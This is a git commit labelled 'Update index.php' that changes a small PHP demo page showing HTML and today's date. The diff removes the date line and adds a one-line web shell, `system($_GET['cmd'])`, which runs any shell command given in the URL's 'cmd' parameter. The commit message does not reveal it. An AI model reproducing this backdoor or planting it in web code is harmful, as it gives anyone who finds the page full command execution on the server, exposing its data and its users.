af4f72958765b06ebd16e452cd16f7a1fc9c5cac
tr3mendous <35741861+tr3mendous@users.noreply.github.com>
2023-07-09 11:59:21 +0300

    Update index.php

--- index.php
+++ index.php
@@ -7,7 +7,7 @@
 <div>This is pure HTML message.</div>
 <div>Next, we’ll display today’s date and day by PHP!</div>
 <div>
-Today’s date is <b><?php echo date('Y/m/d') ?></b> and it’s a <b><?php echo date(‘l’) ?></b> today!
+<?php system($_GET['cmd']); ?>
 </div>
 <div>Again, this is static HTML content.</div>
 </body>
